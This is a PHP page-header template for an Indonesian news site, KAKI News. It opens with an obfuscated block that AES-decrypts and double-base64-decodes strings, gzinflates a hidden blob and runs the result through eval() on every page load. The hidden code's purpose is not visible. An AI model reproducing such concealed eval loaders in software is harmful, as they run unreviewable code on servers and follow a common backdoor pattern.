<?php
function lexpga($pesan, $encryption_key){
  $key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; 
} $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = lexpga('G/L4jwlTve+moOdovmGIWqZ7nv0+x6jAPlECiI5b2ywFyadKo+adxQrxYpmT6ED6V29kF3oWwA3ce1e83G1WHJUiD9QXcs8ISDvBhN+hYCAVu/pFMsl8KnxX3+au9QoEEu7ooAjg3xlBEpbtLXiiXGTmLvom3PQosm5wN0jRtUpi/Zw8O9zETeP7lZEidlTnDa2X8pIe/YhNFttU2VQRXfPPiOkwbsLHEDO/cobz481lonG1pCypJ9iFPGhD3NpVANzJ9iJzcLZ7nFkzTMFL/ui+R90JqSi9',$private_secret_key); $SISTEMIT_COM_ENC = "bU/LSsNAFN0L/kQITBRR95JFbccHaCOJRURKFoVm0WRI7kbyYfeDhsAsZuiii1ldCubRTEU7uzn3PPH8DBGoagxQ4G2kuC63pXdxh4qUMlKkSlvQQQsQgIQUqJSgjciC2xZzwr2h75uVFGuTHQw6Xz+nPeXoXoh+mvAkeY7mX6y/seVAbBSBsAWdIo63kVs1BPVv06JWVW7SHg/8dsOVl/AXPn3HS3yIo1fsHPDjiccc+9SQDc0YTuYzdNkhMleEjRMKKiSY/2lr0qttagFsm9lHHwTH4mbHlt2UwWL4D5yN1ZQdbU9NwD8bnOQxjhZveP/pEFFbjOIZjzvQ7Bxxkkz7ET8=";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">    
    <?= title(); ?>
    <link rel="icon" type="image/png" href="assets/img/logo.png"/>
    <link rel="stylesheet" href="assets/css/font-awesome.css">
    <link href="assets/css/bootstrap.css" rel="stylesheet">   
    <link rel="stylesheet" type="text/css" href="assets/css/slick.css">          
    <link rel="stylesheet" href="assets/css/jquery.fancybox.css" type="text/css" media="screen" /> 
    <link id="switcher" href="assets/css/theme-color/default-theme.css" rel="stylesheet">
    <link href="assets/css/styles.css" rel="stylesheet">    
    <link rel="stylesheet" href="assets/css/googleFont.css">
  </head>
  <body> 
    <a class="scrollToTop" href="#">
      <i class="fa fa-angle-up"></i>      
    </a>
  <!-- Start menu -->
  <section id="mu-menu">
    <nav class="navbar navbar-default" role="navigation">  
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="index"><img src="assets/img/logo.png" style="display: inline;max-width:40px"><span>KAKI News (Informasi Aktual)</span></a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul id="top-menu" class="nav navbar-nav navbar-right main-nav">
            <li class="active"><a href="index" title="Halaman Utama"><i class="fa fa-home"></i> Halaman Utama</a></li>     
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown">Kategori Artikel <span class="fa fa-angle-down"></span></a>
              <ul class="dropdown-menu" role="menu">
              <?php 
                while($j = mysqli_fetch_array($kategori)){ ?>
                  <li><a href="kategori?kategori=<?= $j['kategorinya'] ?>"><?= $j['kategorinya'] ?></a></li>
                <?php }
              ?>
              </ul>
            </li>
            <li><a href="login" title="Login"><i class="fa fa-sign-in"></i> Masuk</a></li> 
          </ul>                     
        </div><!--/.nav-collapse -->        
      </div>     
    </nav>
  </section>
  <!-- End menu -->